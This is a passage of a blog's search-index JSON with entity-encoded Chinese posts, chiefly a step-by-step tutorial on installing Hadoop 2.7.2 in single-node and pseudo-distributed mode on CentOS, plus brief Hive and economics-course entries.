//&#x6240;&#x8FDE;&#x63A5;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x5B9E;&#x4F8B; &lt;value&gt;jdbc:mysql://localhost:3306/hive?characterEncoding=utf8&amp;amp;useSSL=false&lt;/value&gt;&lt;/property&gt; &#x94FE;&#x63A5;&#x76F8;&#x5173;&#x5927;&#x6570;&#x636E;&#x8FDB;&#x9636;&#x8BA1;&#x5212;http://wangxin123.com/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/ Hive&#x4E0B;&#x8F7D;&#x5730;&#x5740;http://mirrors.hust.edu.cn/apache/hive/hive-2.0.1/","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/categories/大数据/"}],"tags":[{"name":"hive","slug":"hive","permalink":"http://www.wangxin123.com/tags/hive/"}]},{"title":"薛兆丰的北大经济学课","slug":"薛兆丰的北大经济学课","date":"2017-02-24T13:18:00.000Z","updated":"2017-02-26T07:45:59.571Z","comments":true,"path":"2017/02/24/薛兆丰的北大经济学课/","link":"","permalink":"http://www.wangxin123.com/2017/02/24/薛兆丰的北大经济学课/","excerpt":"","keywords":null,"text":"&#x6700;&#x8FD1;&#x8BA2;&#x9605;&#x4E86;&#x4E00;&#x5E74;&#x7684;&#x859B;&#x5146;&#x4E30;&#x7684;&#x5317;&#x5927;&#x7ECF;&#x6D4E;&#x5B66;&#x8BFE;&#x7A0B;&#xFF0C;&#x5168;&#x5E74;&#x6A21;&#x5757;&#x5982;&#x4E0B;&#xFF0C;&#x968F;&#x7740;&#x5B66;&#x4E60;&#x6DF1;&#x5165;&#xFF0C;&#x4F1A;&#x9010;&#x6E10;&#x8865;&#x4E0A;&#x76F8;&#x5173;&#x8BFE;&#x7A0B;&#x7684;&#x5B66;&#x4E60;&#x5FC3;&#x5F97;&#x3002;&#x56FE;&#x8C31;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#xFF1A;https://www.processon.com/view/link/58b25351e4b042deea13d552","raw":null,"content":null,"categories":[{"name":"思维导图","slug":"思维导图","permalink":"http://www.wangxin123.com/categories/思维导图/"}],"tags":[{"name":"薛兆丰的北大经济学课","slug":"薛兆丰的北大经济学课","permalink":"http://www.wangxin123.com/tags/薛兆丰的北大经济学课/"}]},{"title":"hadoop2.7.2单机与伪分布式安装","slug":"hadoop2.7.2单机与伪分布式安装","date":"2017-02-21T13:18:00.000Z","updated":"2017-02-26T07:48:33.083Z","comments":true,"path":"2017/02/21/hadoop2.7.2单机与伪分布式安装/","link":"","permalink":"http://www.wangxin123.com/2017/02/21/hadoop2.7.2单机与伪分布式安装/","excerpt":"&#x73AF;&#x5883;&#x76F8;&#x5173;&#x7CFB;&#x7EDF;&#xFF1A;CentOS 6.8 64&#x4F4D;jdk&#xFF1A;1.7.0_79hadoop&#xFF1A;hadoop 2.7.2 &#x5B89;&#x88C5;java&#x73AF;&#x5883;&#x8BE6;&#x89C1;&#xFF1A;linux&#x4E2D;&#x642D;&#x5EFA;java&#x5F00;&#x53D1;&#x73AF;&#x5883; &#x521B;&#x5EFA;hadoop&#x7528;&#x6237;123456789101112131415161718192021222324# &#x4EE5;root&#x7528;&#x6237;&#x767B;&#x5F55;su root# &#x521B;&#x5EFA;&#x4E00;&#x4E2A;hadoop&#x7EC4;&#x4E0B;&#x7684;hadoop&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x4F7F;&#x7528; /bin/bash &#x4F5C;&#x4E3A;shelluseradd -m hadoop -G hadoop -s /bin/bash# useradd &#x4E3B;&#x8981;&#x53C2;&#x6570;# &#xFF0D;c&#xFF1A;&#x52A0;&#x4E0A;&#x5907;&#x6CE8;&#x6587;&#x5B57;&#xFF0C;&#x5907;&#x6CE8;&#x6587;&#x5B57;&#x4FDD;&#x5B58;&#x5728;passwd&#x7684;&#x5907;&#x6CE8;&#x680F;&#x4E2D;&#x3002;# &#xFF0D;d&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x767B;&#x5165;&#x65F6;&#x7684;&#x542F;&#x59CB;&#x76EE;&#x5F55;# &#xFF0D;D&#xFF1A;&#x53D8;&#x66F4;&#x9884;&#x8BBE;&#x503C;# &#xFF0D;e&#xFF1A;&#x6307;&#x5B9A;&#x8D26;&#x53F7;&#x7684;&#x6709;&#x6548;&#x671F;&#x9650;&#xFF0C;&#x7F3A;&#x7701;&#x8868;&#x793A;&#x6C38;&#x4E45;&#x6709;&#x6548;# &#xFF0D;f&#xFF1A;&#x6307;&#x5B9A;&#x5728;&#x5BC6;&#x7801;&#x8FC7;&#x671F;&#x540E;&#x591A;&#x5C11;&#x5929;&#x5373;&#x5173;&#x95ED;&#x8BE5;&#x8D26;&#x53F7;# &#xFF0D;g&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x6240;&#x5C5E;&#x7684;&#x8D77;&#x59CB;&#x7FA4;&#x7EC4;# &#xFF0D;G&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x6240;&#x5C5E;&#x7684;&#x9644;&#x52A0;&#x7FA4;&#x7EC4;# &#xFF0D;m&#xFF1A;&#x81EA;&#x52A8;&#x5EFA;&#x7ACB;&#x7528;&#x6237;&#x7684;&#x767B;&#x5165;&#x76EE;&#x5F55;# &#xFF0D;M&#xFF1A;&#x4E0D;&#x8981;&#x81EA;&#x52A8;&#x5EFA;&#x7ACB;&#x7528;&#x6237;&#x7684;&#x767B;&#x5165;&#x76EE;&#x5F55;# &#xFF0D;n&#xFF1A;&#x53D6;&#x6D88;&#x5EFA;&#x7ACB;&#x4EE5;&#x7528;&#x6237;&#x540D;&#x79F0;&#x4E3A;&#x540D;&#x7684;&#x7FA4;&#x7EC4;# &#xFF0D;r&#xFF1A;&#x5EFA;&#x7ACB;&#x7CFB;&#x7EDF;&#x8D26;&#x53F7;# &#xFF0D;s&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x767B;&#x5165;&#x540E;&#x6240;&#x4F7F;&#x7528;&#x7684;shell# &#xFF0D;u&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;ID&#x53F7;# &#x8BBE;&#x7F6E;hadoop&#x7528;&#x6237;&#x5BC6;&#x7801;&#xFF0C;&#x6309;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x4E24;&#x6B21;&#x5BC6;&#x7801;# &#x5B66;&#x4E60;&#x9636;&#x6BB5;&#x53EF;&#x7B80;&#x5355;&#x8BBE;&#x4E3A;&quot;hadoop&quot;&#xFF0C;&#x82E5;&#x63D0;&#x793A;&#x201C;&#x65E0;&#x6548;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x8FC7;&#x4E8E;&#x7B80;&#x5355;&#x201D;&#xFF0C;&#x5219;&#x518D;&#x6B21;&#x8F93;&#x5165;&#x786E;&#x8BA4;&#x5373;&#x53EF;passwd hadoop","keywords":null,"text":"&#x73AF;&#x5883;&#x76F8;&#x5173;&#x7CFB;&#x7EDF;&#xFF1A;CentOS 6.8 64&#x4F4D;jdk&#xFF1A;1.7.0_79hadoop&#xFF1A;hadoop 2.7.2 &#x5B89;&#x88C5;java&#x73AF;&#x5883;&#x8BE6;&#x89C1;&#xFF1A;linux&#x4E2D;&#x642D;&#x5EFA;java&#x5F00;&#x53D1;&#x73AF;&#x5883; &#x521B;&#x5EFA;hadoop&#x7528;&#x6237;123456789101112131415161718192021222324# &#x4EE5;root&#x7528;&#x6237;&#x767B;&#x5F55;su root# &#x521B;&#x5EFA;&#x4E00;&#x4E2A;hadoop&#x7EC4;&#x4E0B;&#x7684;hadoop&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x4F7F;&#x7528; /bin/bash &#x4F5C;&#x4E3A;shelluseradd -m hadoop -G hadoop -s /bin/bash# useradd &#x4E3B;&#x8981;&#x53C2;&#x6570;# &#xFF0D;c&#xFF1A;&#x52A0;&#x4E0A;&#x5907;&#x6CE8;&#x6587;&#x5B57;&#xFF0C;&#x5907;&#x6CE8;&#x6587;&#x5B57;&#x4FDD;&#x5B58;&#x5728;passwd&#x7684;&#x5907;&#x6CE8;&#x680F;&#x4E2D;&#x3002;# &#xFF0D;d&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x767B;&#x5165;&#x65F6;&#x7684;&#x542F;&#x59CB;&#x76EE;&#x5F55;# &#xFF0D;D&#xFF1A;&#x53D8;&#x66F4;&#x9884;&#x8BBE;&#x503C;# &#xFF0D;e&#xFF1A;&#x6307;&#x5B9A;&#x8D26;&#x53F7;&#x7684;&#x6709;&#x6548;&#x671F;&#x9650;&#xFF0C;&#x7F3A;&#x7701;&#x8868;&#x793A;&#x6C38;&#x4E45;&#x6709;&#x6548;# &#xFF0D;f&#xFF1A;&#x6307;&#x5B9A;&#x5728;&#x5BC6;&#x7801;&#x8FC7;&#x671F;&#x540E;&#x591A;&#x5C11;&#x5929;&#x5373;&#x5173;&#x95ED;&#x8BE5;&#x8D26;&#x53F7;# &#xFF0D;g&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x6240;&#x5C5E;&#x7684;&#x8D77;&#x59CB;&#x7FA4;&#x7EC4;# &#xFF0D;G&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x6240;&#x5C5E;&#x7684;&#x9644;&#x52A0;&#x7FA4;&#x7EC4;# &#xFF0D;m&#xFF1A;&#x81EA;&#x52A8;&#x5EFA;&#x7ACB;&#x7528;&#x6237;&#x7684;&#x767B;&#x5165;&#x76EE;&#x5F55;# &#xFF0D;M&#xFF1A;&#x4E0D;&#x8981;&#x81EA;&#x52A8;&#x5EFA;&#x7ACB;&#x7528;&#x6237;&#x7684;&#x767B;&#x5165;&#x76EE;&#x5F55;# &#xFF0D;n&#xFF1A;&#x53D6;&#x6D88;&#x5EFA;&#x7ACB;&#x4EE5;&#x7528;&#x6237;&#x540D;&#x79F0;&#x4E3A;&#x540D;&#x7684;&#x7FA4;&#x7EC4;# &#xFF0D;r&#xFF1A;&#x5EFA;&#x7ACB;&#x7CFB;&#x7EDF;&#x8D26;&#x53F7;# &#xFF0D;s&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;&#x767B;&#x5165;&#x540E;&#x6240;&#x4F7F;&#x7528;&#x7684;shell# &#xFF0D;u&#xFF1A;&#x6307;&#x5B9A;&#x7528;&#x6237;ID&#x53F7;# &#x8BBE;&#x7F6E;hadoop&#x7528;&#x6237;&#x5BC6;&#x7801;&#xFF0C;&#x6309;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x4E24;&#x6B21;&#x5BC6;&#x7801;# &#x5B66;&#x4E60;&#x9636;&#x6BB5;&#x53EF;&#x7B80;&#x5355;&#x8BBE;&#x4E3A;&quot;hadoop&quot;&#xFF0C;&#x82E5;&#x63D0;&#x793A;&#x201C;&#x65E0;&#x6548;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x8FC7;&#x4E8E;&#x7B80;&#x5355;&#x201D;&#xFF0C;&#x5219;&#x518D;&#x6B21;&#x8F93;&#x5165;&#x786E;&#x8BA4;&#x5373;&#x53EF;passwd hadoop &#x53EF;&#x4E3A;hadoop&#x7528;&#x6237;&#x589E;&#x52A0;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#xFF0C;&#x907F;&#x514D;&#x4E00;&#x4E9B;&#x5BF9;&#x65B0;&#x624B;&#x6765;&#x8BF4;&#x6BD4;&#x8F83;&#x68D8;&#x624B;&#x7684;&#x6743;&#x9650;&#x95EE;&#x9898;&#x3002;123456789visudo# &#x627E;&#x5230; root ALL=(ALL) ALL &#x8FD9;&#x884C;# &#x5927;&#x81F4;&#x5728;&#x7B2C;98&#x884C;&#xFF0C;&#x53EF;&#x5148;&#x6309;&#x4E00;&#x4E0B;&#x952E;&#x76D8;&#x4E0A;&#x7684;ESC&#x952E;&#xFF0C;&#x7136;&#x540E;&#x8F93;&#x5165; :98# &#x5728;&#x8FD9;&#x884C;&#x4E0B;&#x9762;&#x589E;&#x52A0;&#x4E00;&#x884C;&#x5185;&#x5BB9; hadoop ALL=(ALL) ALL## Allow root to run any commands anywhereroot ALL=(ALL) ALLhadoop ALL=(ALL) ALL &#x4FDD;&#x5B58;&#x9000;&#x51FA;&#x540E;&#x4EE5;&#x521A;&#x624D;&#x521B;&#x5EFA;&#x7684;hadoop&#x7528;&#x6237;&#x767B;&#x5F55; &#x914D;&#x7F6E;SSH&#x514D;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x96C6;&#x7FA4;&#x3001;&#x5355;&#x8282;&#x70B9;&#x6A21;&#x5F0F;&#x90FD;&#x9700;&#x8981;&#x7528;&#x5230; SSH &#x767B;&#x9646;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;CentOS &#x9ED8;&#x8BA4;&#x5DF2;&#x5B89;&#x88C5;&#x4E86; SSH client&#x3001;SSH server&#xFF0C;&#x6253;&#x5F00;&#x7EC8;&#x7AEF;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x68C0;&#x9A8C;&#xFF0C;&#x67E5;&#x770B;&#x662F;&#x5426;&#x5305;&#x542B;&#x4E86;SSH client&#x8DDF;SSH server12345[hadoop@iZwz9b62gfdv0s2e67yo8kZ hadoop]$ rpm -qa | grep sshlibssh2-1.4.2-2.el6_7.1.x86_64openssh-5.3p1-118.1.el6_8.x86_64openssh-clients-5.3p1-118.1.el6_8.x86_64openssh-server-5.3p1-118.1.el6_8.x86_64 &#x5982;&#x679C;&#x4E0D;&#x5305;&#x542B;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;yum&#x8FDB;&#x884C;&#x5B89;&#x88C5;12sudo yum install openssh-clientssudo yum install openssh-server &#x6D4B;&#x8BD5;&#x4E0B;ssh&#x662F;&#x5426;&#x53EF;&#x7528;12# &#x6309;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x5BC6;&#x7801;hadoop&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x767B;&#x9646;&#x5230;&#x672C;&#x673A;ssh localhost &#x4F46;&#x8FD9;&#x6837;&#x767B;&#x9646;&#x662F;&#x9700;&#x8981;&#x6BCF;&#x6B21;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x6210;SSH&#x65E0;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x3002;&#x9996;&#x5148;&#x8F93;&#x5165; exit &#x9000;&#x51FA;&#x521A;&#x624D;&#x7684; ssh&#xFF0C;&#x5C31;&#x56DE;&#x5230;&#x4E86;&#x6211;&#x4EEC;&#x539F;&#x5148;&#x7684;&#x7EC8;&#x7AEF;&#x7A97;&#x53E3;&#x3002;&#x7136;&#x540E;&#x5229;&#x7528; ssh-keygen &#x751F;&#x6210;&#x5BC6;&#x94A5;&#xFF0C;&#x5E76;&#x5C06;&#x5BC6;&#x94A5;&#x52A0;&#x5165;&#x5230;&#x6388;&#x6743;&#x4E2D;&#x3002;12345678910111213# &#x9000;&#x51FA;&#x521A;&#x624D;&#x7684; ssh localhostexit# &#x82E5;&#x6CA1;&#x6709;&#x8BE5;&#x76EE;&#x5F55;&#xFF0C;&#x8BF7;&#x5148;&#x6267;&#x884C;&#x4E00;&#x6B21;ssh localhostcd ~/.ssh/# pwd&#x67E5;&#x770B;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#xFF0C;&#x5E94;&#x4E3A;&quot;/home/hadoop/&quot;# ~ &#x4EE3;&#x8868;&#x7684;&#x662F;&#x7528;&#x6237;&#x7684;&#x4E3B;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x5373; &#x201C;/home/&#x7528;&#x6237;&#x540D;&#x201D; &#x8FD9;&#x4E2A;&#x76EE;&#x5F55;# &#x4F1A;&#x6709;&#x63D0;&#x793A;&#xFF0C;&#x90FD;&#x6309;&#x56DE;&#x8F66;&#x5C31;&#x53EF;&#x4EE5;ssh-keygen -t rsa cat id_rsa.pub &gt;&gt; authorized_keyschmod 600 ./authorized_keys &#x6B64;&#x65F6;&#x518D;&#x7528; ssh localhost &#x547D;&#x4EE4;, &#x65E0;&#x9700;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x767B;&#x9646;&#x4E86;123456789[hadoop@iZwz9b62gfdv0s2e67yo8kZ .ssh]$ ssh localhostLast login: Wed Feb 20 22:29:22 2017 from 127.0.0.1Welcome to Alibaba Cloud Elastic Compute Service ![hadoop@iZwz9b62gfdv0s2e67yo8kZ ~]$ exitlogoutConnection to localhost closed.[hadoop@iZwz9b62gfdv0s2e67yo8kZ .ssh]$ &#x5B89;&#x88C5;hadoop2&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://mirrors.hust.edu.cn/apache/hadoop/common/hadoop-2.7.2/ &#x3002;&#x4E0B;&#x8F7D; hadoop-2.7.2.tar.gz &#x548C; hadoop-2.7.2.tar.gz.mds &#x6587;&#x4EF6;&#xFF0C;&#x4FDD;&#x5B58;&#x5728;/data/install_package/hadoop&#x3002; &#x5176;&#x4E2D;hadoop-2.x.y.tar.gz.mds&#x6587;&#x4EF6;&#x662F;&#x7528;&#x6765;&#x68C0;&#x67E5;hadoop-2.x.y.tar.gz &#x6587;&#x4EF6;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x7684;&#x3002;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x53D1;&#x751F;&#x4E86;&#x635F;&#x574F;&#x6216;&#x4E0B;&#x8F7D;&#x4E0D;&#x5B8C;&#x6574;&#xFF0C;Hadoop &#x5C06;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x8FD0;&#x884C;&#x3002;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#x5982;&#x4E0B;&#xFF1A;123cd /data/install_package/hadoophead -n 6 hadoop-2.7.2.tar.gz.mdsmd5sum hadoop-2.7.2.tar.gz | tr &quot;a-z&quot; &quot;A-Z&quot; &#x82E5;hadoop-2.x.y.tar.gz&#x4E0D;&#x5B8C;&#x6574;&#xFF0C;&#x5219;&#x8FD9;&#x4E24;&#x4E2A;&#x503C;&#x5DEE;&#x522B;&#x5F88;&#x5927; &#x6211;&#x4EEC;&#x9009;&#x62E9;&#x5C06; Hadoop &#x5B89;&#x88C5;&#x81F3; /data/hadoop/ &#x4E2D;12345sudo tar -zxf /data/install_package/hadoop/hadoop-2.6.0.tar.gz -C /data/hadoopcd /data/hadoop/sudo mv ./hadoop-2.7.2/ ./hadoop# &#x8D4B;&#x4E88;&#x6743;&#x9650;&#xFF0C;hadoop&#x7EC4;&#x53CA;hadoop&#x7528;&#x6237;&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x914D;&#x7F6E;sudo chown -R hadoop:hadoop ./hadoop Hadoop &#x89E3;&#x538B;&#x540E;&#x5373;&#x53EF;&#x4F7F;&#x7528;&#x3002;&#x8F93;&#x5165;hadoop version&#xFF0C;&#x6210;&#x529F;&#x4F1A;&#x663E;&#x793A;&#x7248;&#x672C;&#x4FE1;&#x606F; hadoop&#x5355;&#x673A;&#x914D;&#x7F6E;(&#x975E;&#x5206;&#x5E03;&#x5F0F;)Hadoop &#x9ED8;&#x8BA4;&#x4E3A;&#x975E;&#x5206;&#x5E03;&#x5F0F;&#x6A21;&#x5F0F;&#xFF0C;&#x975E;&#x5206;&#x5E03;&#x5F0F;&#x5373;&#x5355; Java &#x8FDB;&#x7A0B;&#x3002; Hadoop &#x9ED8;&#x8BA4;&#x9644;&#x5E26;&#x4E86;&#x4E30;&#x5BCC;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x5305;&#x62EC; wordcount&#x3001;terasort&#x3001;join&#x3001;grep &#x7B49;&#x3002;&#x6267;&#x884C;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#xFF1A; &#x5728;&#x6B64;&#x6211;&#x4EEC;&#x9009;&#x62E9;&#x8FD0;&#x884C; grep &#x4F8B;&#x5B50;&#xFF0C;&#x5C06; input &#x6587;&#x4EF6;&#x5939;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#xFF0C;&#x7B5B;&#x9009;&#x5F53;&#x4E2D;&#x7B26;&#x5408;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F; dfs[a-z.]+ &#x7684;&#x5355;&#x8BCD;&#x5E76;&#x7EDF;&#x8BA1;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x5230; output &#x6587;&#x4EF6;&#x5939;&#x4E2D;&#x3002;1234567891011cd /data/hadoopmkdir ./input# &#x5C06;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#x6587;&#x4EF6;cp ./etc/hadoop/*.xml ./input # &#x7B5B;&#x9009;&#x7B26;&#x5408;&#x89C4;&#x5219;&#x7684;&#x5355;&#x8BCD;&#x5E76;&#x7EDF;&#x8BA1;&#x5176;&#x51FA;&#x73B0;&#x6B21;&#x6570;./bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-*.jar grep ./input ./output &apos;dfs[a-z.]+&apos;# &#x67E5;&#x770B;&#x8FD0;&#x884C;&#x7ED3;&#x679C;[hadoop@iZwz9b62gfdv0s2e67yo8kZ hadoop]$ cat ./output/* 1 dfsadmin &#x82E5;&#x8FD0;&#x884C;&#x51FA;&#x73B0; WARN &#x63D0;&#x793A;&#x3010;WARN util.NativeCodeLoader: Unable to load native-hadoop library for your platform&#x2026; using builtin-java classes where applicable&#x3011;&#xFF0C;&#x53EF;&#x4EE5;&#x5FFD;&#x7565;&#xFF0C;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD; Hadoop &#x6B63;&#x5E38;&#x8FD0;&#x884C;&#xFF08;&#x53EF;&#x901A;&#x8FC7;&#x7F16;&#x8BD1; Hadoop &#x6E90;&#x7801;&#x89E3;&#x51B3;&#xFF0C;&#x8BE6;&#x89C1;&#xFF1A;http://www.cnblogs.com/wuren/p/3962511.html&#xFF09;&#x3002; &#x6CE8;&#x610F;&#xFF0C;Hadoop &#x9ED8;&#x8BA4;&#x4E0D;&#x4F1A;&#x8986;&#x76D6;&#x7ED3;&#x679C;&#x6587;&#x4EF6;&#xFF0C;&#x56E0;&#x6B64;&#x518D;&#x6B21;&#x8FD0;&#x884C;&#x4E0A;&#x9762;&#x5B9E;&#x4F8B;&#x4F1A;&#x63D0;&#x793A;&#x51FA;&#x9519;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5C06; ./output &#x5220;&#x9664;&#x3002; hadoop&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x914D;&#x7F6E;Hadoop &#x53EF;&#x4EE5;&#x5728;&#x5355;&#x8282;&#x70B9;&#x4E0A;&#x4EE5;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x65B9;&#x5F0F;&#x8FD0;&#x884C;&#xFF0C;&#x914D;&#x7F6E;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8BBE;&#x7F6E;HADOOP&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;123456789101112131415# &#x7F16;&#x8F91;profilevim /etc/profile# &#x6587;&#x4EF6;&#x672B;&#x5C3E;&#x65B0;&#x589E;export HADOOP_HOME=/data/hadoopexport HADOOP_INSTALL=$HADOOP_HOMEexport HADOOP_MAPRED_HOME=$HADOOP_HOMEexport HADOOP_COMMON_HOME=$HADOOP_HOMEexport HADOOP_HDFS_HOME=$HADOOP_HOMEexport YARN_HOME=$HADOOP_HOMEexport HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/nativeexport PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin# &#x4F7F;&#x914D;&#x7F6E;&#x751F;&#x6548;source /etc/profile &#x7136;&#x540E;&#x4FEE;&#x6539;HADOOP&#x6838;&#x5FC3;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x6587;&#x4EF6;&#x4F4D;&#x4E8E; /data/hadoop/etc/hadoop/ &#x4E2D;&#x3002;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x9700;&#x8981;&#x4FEE;&#x6539;2&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6; core-site.xml &#x548C; hdfs-site.xml&#x3002; &#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6; core-site.xml&#xFF1A;12345678910111213141516# &#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&lt;configuration&gt;&lt;/configuration&gt;# &#x4FEE;&#x6539;&#x4E3A;&lt;configuration&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;file:/data/hadoop/tmp&lt;/value&gt; &lt;description&gt;Abase for other temporary directories.&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; &#x540C;&#x6837;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6; hdfs-site.xml&#xFF1A;12345678910111213141516171819# &#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&lt;configuration&gt;&lt;/configuration&gt;# &#x4FEE;&#x6539;&#x4E3A;&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:/data/hadoop/tmp/dfs/name&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/data/hadoop/tmp/dfs/data&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; hadoop&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;&#x53EF;&#x67E5;&#x770B;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x79FB;&#x6B65;&#xFF1A;http://www.iyunv.com/thread-17698-1-1.html &#x914D;&#x7F6E;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x683C;&#x5F0F;&#x5316;NameNode1./bin/hdfs namenode -format &#x6210;&#x529F;&#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x770B;&#x5230; &#x201C;successfully formatted&#x201D; &#x548C; &#x201C;Exitting with status 0&#x201D; &#x7684;&#x63D0;&#x793A;&#xFF0C;&#x82E5;&#x4E3A; &#x201C;Exitting with status 1&#x201D; &#x5219;&#x662F;&#x51FA;&#x9519;&#x3002; &#x63A5;&#x7740;&#x5F00;&#x542F; NaneNode &#x548C; DataNode &#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF1A;1./sbin/start-dfs.sh &#x82E5;&#x51FA;&#x73B0;&#x5982;&#x4E0B; SSH &#x7684;&#x63D0;&#x793A; &#x201C;Are you sure you want to continue connecting&#x201D;&#xFF0C;&#x8F93;&#x5165; yes &#x5373;&#x53EF;&#x3002;&#x542F;&#x52A8;&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x6709; WARN &#x63D0;&#x793A; &#x201C;WARN util.NativeCodeLoader&#x2026;&#x201D;&#xFF0C;&#x5982;&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;&#xFF0C;&#x8FD9;&#x4E2A;&#x63D0;&#x793A;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x6B63;&#x5E38;&#x4F7F;&#x7528;&#x3002; &#x542F;&#x52A8;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x547D;&#x4EE4; jps &#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6210;&#x529F;&#x542F;&#x52A8;&#xFF0C;&#x82E5;&#x6210;&#x529F;&#x542F;&#x52A8;&#x5219;&#x4F1A;&#x5217;&#x51FA;&#x5982;&#x4E0B;&#x8FDB;&#x7A0B;: &#x201C;NameNode&#x201D;&#x3001;&#x201D;DataNode&#x201D;&#x548C;SecondaryNameNode&#xFF08;&#x5982;&#x679C; SecondaryNameNode &#x6CA1;&#x6709;&#x542F;&#x52A8;&#xFF0C;&#x8BF7;&#x8FD0;&#x884C; sbin/stop-dfs.sh &#x5173;&#x95ED;&#x8FDB;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6B21;&#x5C1D;&#x8BD5;&#x542F;&#x52A8;&#x5C1D;&#x8BD5;&#xFF09;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709; NameNode &#x6216; DataNode 